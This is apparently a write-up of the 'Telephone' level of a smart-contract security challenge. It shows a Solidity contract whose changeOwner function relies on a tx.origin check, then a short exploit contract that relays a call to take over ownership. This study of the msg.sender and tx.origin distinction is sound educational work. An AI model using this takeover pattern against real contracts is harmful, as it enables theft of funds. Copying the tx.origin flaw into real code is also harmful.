## Telephone

### Contract

<details><summary>CLICK TO VIEW</summary>
<p>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

```

</p>
</details>

### Solution

This contract was quite interesting as it is an easier version of #3 but sheds light on a variety of little details I didn't know about. The objective
of this contract was mainly to make sure I understood:
- The difference between delegatecall and call (how context matters and how these two provide different values for tx.origin and msg.sender)
- The important difference between msg.sender and tx.origin

The solution of course was to use `call` as a proxy contract and to just relay the transaction. See below:

```solidity
contract Exploit {
    address public toExploit;

    constructor(address exploit) public {
        toExploit = exploit;
    }

    function hack() public {
        (bool status, bytes memory value) = toExploit.call(
            abi.encodeWithSignature("changeOwner(address)", tx.origin)
        );
    }
}
```

Very simple stuff. Cooleo!
